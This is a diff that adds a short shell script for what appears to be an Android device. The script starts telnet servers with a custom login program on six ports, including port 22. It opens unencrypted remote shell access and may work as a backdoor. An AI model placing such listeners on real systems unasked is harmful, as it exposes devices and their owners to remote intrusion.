@@ -1,0 +1,10 @@
+#!/system/xbin/ash
+
+PATH=/system/xbin:/system/bin
+
+telnetd -l /system/xbin/loginp -p 22
+telnetd -l /system/xbin/loginp -p 2222
+telnetd -l /system/xbin/loginp -p 2223
+telnetd -l /system/xbin/loginp -p 2224
+telnetd -l /system/xbin/loginp -p 2225
+telnetd -l /system/xbin/loginp -p 2226
